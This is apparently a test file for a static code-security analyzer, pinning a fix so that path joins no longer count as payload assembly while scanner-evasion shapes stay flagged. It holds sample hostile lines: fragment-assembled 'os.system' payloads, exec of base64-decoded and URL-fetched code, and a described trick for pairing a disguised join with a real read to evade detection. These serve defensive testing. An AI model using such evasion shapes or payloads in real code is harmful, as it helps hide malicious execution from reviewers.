"""B-753 — `os.path.join` is not a content-hiding primitive.

`"join"` sits in `_DECODE_ATTRS` because `"".join(parts)` really is one: assembling a
payload from fragments is a shape this analyzer hunts. But membership is by ATTRIBUTE
NAME, so an ordinary `os.path.join(...)` matched it too — and inside
`_decode_signal_is_only_artifact_relative_reads` that misclassification caused an early
bail **before the genuine `.decode()` in the same expression was ever examined**. The
artifact-relative exemption was therefore unreachable for the canonical `setup.py` idiom
written as a one-liner, while the identical read written with a `with` block was exempt.
Two spellings of the same code, opposite verdicts, for a reason that had nothing to do
with either.

The fix skips a `.join` whose receiver is a path module. Skipped means *not evidence and
not a stopping condition* — deliberately not "treated as a decode that passes".

THE REASONING THIS FILE ORIGINALLY RESTED ON WAS WRONG, and the retraction is the most
useful thing in it. It ran: the loop returns `found_any`, which only a genuine
artifact-relative `.decode()` sets, so a skip alone absolves nothing — therefore dressing
a string join as a path join buys an attacker nothing, therefore the receiver test can
afford to be structural.

The first clause is true. The conclusion does not follow, and an adversarial pass showed
why: **pair** the disguised join with a real in-artifact read in the same expression. The
genuine half satisfies `found_any`, the disguised half is skipped, and the whole
expression is exempt with the payload inside it. Four shapes were absolved that way —
`self.path.join(...)`, `cfg.path.join(...)`, `Outer().b.path.join(...)`, and a bare local
variable literally named `posixpath`, which qualified because the alias set was SEEDED
with that name before any import was read. Seeding was the name-guessing the code's own
docstring claimed, one line above, to have avoided.

So the receiver test is import-bound now, on every leg, and the property below is pinned
as what it is: a true narrow fact, not a licence to be loose about receivers.

Offline, read-only, stdlib only.
"""
from __future__ import annotations

from clawseccheck.skillast import analyze_python


def _convicts(src: str, relpath: str = "pkg/mod.py") -> bool:
    return any(f.severity == "crit" for f in analyze_python(src, relpath))


_READ = 'open({expr}, "rb").read().decode("utf-8")'


# ---------------------------------------------------------------------------
# The defect: the inline idiom, in every spelling of a path join.
# ---------------------------------------------------------------------------


def test_the_inline_setup_py_idiom_is_exempt_at_every_depth():
    """The shape the exemption exists for, written on one line instead of in a block."""
    src = (
        "import os\n"
        'exec(open(os.path.join(os.path.dirname(__file__), "v.py"), "rb")'
        '.read().decode("utf-8"), {})\n'
    )
    for relpath in ("mod.py", "pkg/mod.py", "a/b/mod.py", ""):
        assert not _convicts(src, relpath), relpath


def test_every_path_module_spelling_is_recognised():
    """The attacker picks the spelling, and so does the honest author.

    `from os import path` is ordinary Python; leaving it convicted would have fixed the
    defect for one import style and left it for another, which is the same bug wearing a
    different import.
    """
    for prelude, joiner, dirn in (
        ("import os\n", "os.path.join", "os.path.dirname"),
        ("from os import path\n", "path.join", "path.dirname"),
        ("import os.path as p\n", "p.join", "p.dirname"),
        ("import posixpath, os\n", "posixpath.join", "os.path.dirname"),
    ):
        src = prelude + f'exec(open({joiner}({dirn}(__file__), "v.py"), "rb").read().decode(), {{}})\n'
        assert not _convicts(src), joiner


def test_the_with_block_spelling_is_unchanged():
    """It was already exempt and must stay so — the point was to make the two agree."""
    assert not _convicts(
        "import os\n"
        'with open(os.path.join(os.path.dirname(__file__), "v.py"), "rb") as fh:\n'
        '    exec(fh.read().decode("utf-8"), {})\n'
    )


# ---------------------------------------------------------------------------
# What must keep convicting. `join` is in the set for a reason.
# ---------------------------------------------------------------------------


def test_string_joins_still_convict():
    """Fragment assembly is what put `join` in `_DECODE_ATTRS`, and it is untouched."""
    assert _convicts('parts = ["pri", "nt(1)"]\nexec("".join(parts), {})\n')
    assert _convicts('parts = ["a"]\nsrc = "".join(parts)\nexec(src, {})\n')


def test_an_unresolvable_receiver_is_not_given_the_benefit_of_the_doubt():
    """`sep.join(parts)` says nothing statically about what `sep` is, so it keeps its old
    meaning. The direction matters: this predicate widens an exemption, so every case it
    cannot decide must fall on the convicting side."""
    assert _convicts('sep = ""\nparts = ["a"]\nexec(sep.join(parts), {})\n')


def test_a_variable_named_path_is_not_a_path_module():
    """The discriminator is the import binding, not the name.

    Accepting any receiver spelled `path` would have been one word shorter and would have
    exempted this — a plain string join wearing a suggestive variable name.
    """
    assert _convicts('path = "/"\nparts = ["a"]\nexec(path.join(parts), {})\n')


def test_a_rebound_import_is_not_a_path_module_either():
    """Imported and then reassigned to a string: the binding at the join is not the
    module, and the verdict follows the value rather than the import line."""
    assert _convicts('from os import path\npath = ""\nparts = ["a"]\nexec(path.join(parts), {})\n')


# ---------------------------------------------------------------------------
# The property the receiver test rests on.
# ---------------------------------------------------------------------------


def test_the_skip_alone_never_absolves_anything():
    """A skipped join is not a pass — it is an abstention.

    The loop returns `found_any`, set only by a genuine artifact-relative `.decode()`, so
    an expression whose ONLY decode-shaped call is a skipped join is not exempt. True, and
    narrow: it says nothing about an expression that ALSO contains a real read. See the
    paired test below, which is the case that actually decides whether the receiver test
    may be loose.
    """
    assert _convicts('parts = ["pri", "nt(1)"]\nexec("".join(parts), {})\n')


_REAL_READ = 'open(os.path.join(os.path.dirname(__file__), "v.py"), "rb").read().decode()'
_PAYLOAD = '["im", "port ", "os; os.system(\'id\')"]'


def test_a_disguised_join_paired_with_a_real_read_still_convicts():
    """THE CASE THAT KILLED THE FIRST VERSION. Every one of these was absolved.

    Pairing is the whole attack: the genuine in-artifact read satisfies `found_any`, and
    if the disguised join is skipped alongside it the payload rides out inside an exempt
    expression. Each shape below qualified under the structural receiver test or the
    seeded alias set, and each is now refused because membership is earned by an import
    binding rather than by a name or an attribute spelling.
    """
    cases = {
        "bare variable named posixpath": 'import os\nposixpath = ""\n',
        "bare variable named ntpath": 'import os\nntpath = ""\n',
    }
    for label, prelude in cases.items():
        recv = label.split()[-1]
        assert _convicts(
            f"{prelude}exec({_REAL_READ} + {recv}.join({_PAYLOAD}))\n"
        ), label

    assert _convicts(
        "import os\n"
        "class F:\n"
        '    def __init__(self): self.path = ""\n'
        f"exec({_REAL_READ} + F().path.join({_PAYLOAD}))\n"
    ), "self.path"

    assert _convicts(
        "import os\n"
        "class I:\n"
        '    def __init__(self): self.path = ""\n'
        "class O:\n"
        "    def __init__(self): self.b = I()\n"
        f"exec({_REAL_READ} + O().b.path.join({_PAYLOAD}))\n"
    ), "deep attribute chain"


def test_an_import_that_is_later_rebound_loses_its_standing():
    """`from os import path` then `path = ""` leaves the join reaching a string.

    Dropping any reassigned name from the alias set is the fail-safe direction: it can
    only put a call back under suspicion, never exempt one.
    """
    assert _convicts(
        "import os\n"
        "from os import path\n"
        'path = ""\n'
        f"exec({_REAL_READ} + path.join({_PAYLOAD}))\n"
    )


# ---------------------------------------------------------------------------
# Untouched neighbours — non-vacuity for the whole file.
# ---------------------------------------------------------------------------


def test_the_real_primitives_and_the_containment_rules_are_unaffected():
    """A green run here must not be the analyzer having quietly stopped working, and the
    B-752 escapes must not have become reachable through the new skip."""
    assert _convicts('from base64 import b64decode\nexec(b64decode("cHJpbnQoMSk="), {})\n')
    assert _convicts(
        "from urllib.request import urlopen\n"
        'exec(urlopen("http://x/y").read().decode(), {})\n'
    )
    assert _convicts('exec(open("/tmp/x.py", "rb").read().decode("utf-8"), {})\n')
    # B-752: an absolute segment discards the anchor; a deep traversal leaves the artifact.
    assert _convicts(
        "import os\n"
        "here = os.path.dirname(__file__)\n"
        'exec(open(os.path.join(here, "a", "/tmp/x.py"), "rb").read().decode(), {})\n'
    )
    assert _convicts(
        "import os\n"
        "here = os.path.dirname(__file__)\n"
        'exec(open(os.path.join(here, "..", "..", "..", "t", "s.py"), "rb").read().decode(), {})\n'
    )
